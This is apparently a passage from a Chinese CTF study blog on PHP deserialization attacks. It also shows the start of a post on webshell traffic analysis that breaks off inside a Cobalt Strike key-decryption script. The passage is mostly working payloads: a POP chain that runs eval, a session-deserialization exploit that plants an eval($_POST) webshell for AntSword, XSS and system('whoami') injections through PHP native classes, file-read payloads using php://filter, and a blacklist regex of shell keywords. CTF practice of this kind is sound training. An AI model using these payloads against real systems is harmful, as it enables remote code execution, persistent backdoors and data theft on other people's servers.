<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:“User”:2:&#123;s:3:“age”;i:20;s:4:“name”;s:4:“daye”;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast-destruct"></a>fast-destruct</h2><p>删除末尾花括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:“User”:2:&#123;s:3:“age”;i:20;s:4:“name”;s:4:“daye”;</span><br></pre></td></tr></table></figure>

<p>数组对象占用指针（改数字）</p>
<h2 id="amp-绕过"><a href="#amp-绕过" class="headerlink" title="&amp;绕过"></a>&amp;绕过</h2><p>2024年金盾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice-&gt;<span class="title function_ invoke__">nothing</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fish-&gt;d))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;you wrong&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$no</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$pop</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you will get flag&quot;</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=&amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$zhou</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;c=<span class="keyword">new</span> <span class="title function_ invoke__">ct</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;c-&gt;fish=<span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;c-&gt;fish-&gt;rice=<span class="keyword">new</span> <span class="title function_ invoke__">get</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;c-&gt;fish-&gt;rice-&gt;cmd=<span class="string">&quot;print(`nl /realflag/you_want_flag.php`);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhou</span>);</span><br></pre></td></tr></table></figure>



<h1 id="php-session-反序列化"><a href="#php-session-反序列化" class="headerlink" title="php-session 反序列化"></a>php-session 反序列化</h1><h2 id="session-工作原理"><a href="#session-工作原理" class="headerlink" title="session 工作原理"></a>session 工作原理</h2><p>当一个session第一次被启用时，一个唯一的标识被存储于本地的cookie中。</p>
<p>首先使用session_start()函数，PHP从session仓库中加载已经存储的session变量。</p>
<p>当执行PHP脚本时，通过使用session_register()函数注册session变量。</p>
<p>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用。</p>
<h2 id="session存储的方式"><a href="#session存储的方式" class="headerlink" title="session存储的方式"></a>session存储的方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_serialize  经过serialize()函数序列化数组</span><br><span class="line">php            键名+竖线+经过serialize()函数处理的值</span><br><span class="line">php_binary     键名的长度对应的ascii字符+键名+serialize()函数序列化的值</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;meng&#x27;] = &#x27;meng&#x27;;</span><br></pre></td></tr></table></figure>

<p>结果为：meng|s:4:”meng”;  </p>
<p>键值 | 序列化处理的值</p>
<p>php.ini 下的session 的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;  --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php </span><br></pre></td></tr></table></figure>

<p><a href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)</a></p>
<p><a href="https://www.cnblogs.com/meng-han/p/16851760.html">ctfshow web263(PHP的session反序列化漏洞) - hithub - 博客园 (cnblogs.com)</a></p>
<p>设置session储存方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>ctfshow 例题web263</p>
<p>用dirsearch扫一下，发现<a href="http://www.zip文件,访问下载下来是网站源码./">www.zip文件，访问下载下来是网站源码。</a></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>check.p</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //密码必须为<span class="number">128</span>位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//登陆成功取消次数累计</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//登陆失败累计次数加1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);  <span class="comment">// 这里设置储存方式为php类型</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用点写入一个内容为$password的内容 </p>
<p>payload；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$res</span>));</span><br></pre></td></tr></table></figure>

<p>| 前面将会成为键值 ，|后面的将被反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>payload 使用方式</p>
<p>首先访问首页， 获得cookie ,同时建立session</p>
<p>  抓包改limit值为payload</p>
<p>访问check.php实现反序列化shell的写入</p>
<p>url&#x2F;log-1.php</p>
<p>蚁剑连接</p>
<h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><p>吐出来有效字符</p>
<h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><p>吃掉后面的字符</p>
<h1 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h1><h2 id="报错类"><a href="#报错类" class="headerlink" title="报错类"></a>报错类</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p>
<p>我们来随便弄一个DEMO试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>ERROR类中自动带有tostring魔术方法，我们如果这里把他当字符串输出，会自动触发tostring方法，如果这里是echo，即可造成XSS</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">http://127.0.0.1/?a=Error&amp;b=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>和Error类一样，也自带tostring方法，也可以造成XSS</p>
<p>既然如此，可以会被PHP执行，我们可以换一种写法，用eval()函数让他造成RCE即可在实战中使用</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">eval(&quot;echo new $a($b);&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=Exception&amp;b=system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>因为echo new $a($b);会输出system(“whoami”)，然后会被eval放入代码中去执行，即可造成RCE</p>
<h2 id="遍历目录类"><a href="#遍历目录类" class="headerlink" title="遍历目录类"></a>遍历目录类</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator类中有一个__construct()方法，他会构造一个迭代器，如果使用echo进行输出，他会返回迭代器的第一个</p>
<p>demo:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们这时候如果传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=.</span><br></pre></td></tr></table></figure>

<p>此时是遍历当前目录，他回返回第一项，也就应该是一个点</p>
<p>有的师傅就说了，这有个勾八用，我们其实还可以使用glob:&#x2F;&#x2F;协议进行匹配其余的文件</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://flag*</span><br></pre></td></tr></table></figure>

<p>这里的*依旧是通配符，就会匹配当前目录下的带有flag的文件</p>
<p>这里如果不知道文件名，可以直接暴力搜索，使用正则匹配去使用</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://f[a-z]*</span><br></pre></td></tr></table></figure>

<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>和Directorylterator差不多，不重复赘述</p>
<h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=GlobIterator&amp;b=f[a-z]*</span><br></pre></td></tr></table></figure>

<h2 id="读取文件类"><a href="#读取文件类" class="headerlink" title="读取文件类"></a>读取文件类</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h3><p>SplFileObject类为文件提供了一个面向对象接口，也就是这个类可以用来读文件</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们传入?a&#x3D;SplFileObject&amp;b&#x3D;flag.php，即可读取我们flag.php里面的内容，但是他只能读一行！！！</p>
<p>除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="反射类"><a href="#反射类" class="headerlink" title="反射类"></a>反射类</h2><h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</p>
<p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p>
<p>这里我们直接使用CTFshow的web109来作为例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; </span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;]; </span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;]; </span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; </span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>已知了flag在<code>./fl36dg.txt</code>，命令执行<code>system(‘cat fl36dg.txt’)</code>获取flag，所以应该传入如下参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><p>和ReflectionClass一样，直接上图</p>
<p><code>Typecho_Db_Exception</code>类在&#x2F;var&#x2F;Typecho&#x2F;Db&#x2F;Query.php中，这里有一个<code>//__toString()</code>的注释，直接看__toString函数里的内容</p>
<p>[PHP原生类在CTF当中的应用🛴 | ch1e的随笔 (gitee.io)]</p>
<h1 id="phar文件利用"><a href="#phar文件利用" class="headerlink" title="phar文件利用"></a>phar文件利用</h1><p>在文件包含里面讲过了</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[<a href="https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502">CTF]PHP反序列化总结_ctf php反序列化-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell流量分析</title>
    <url>/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>cs 流量</p>
<p>冰蝎流量</p>
<p>蚁剑流量</p>
<p>哥斯拉流量</p>
<span id="more"></span>

<h1 id="cs-流量"><a href="#cs-流量" class="headerlink" title="cs 流量"></a>cs 流量</h1><p>流量特征值</p>
<p>存在两个文件</p>
<p>.cobaltstrike.beacon_keys</p>
<p>pcapng</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_RSA_PriKey</span>(<span class="params">SerializeKeyPath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, privateKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    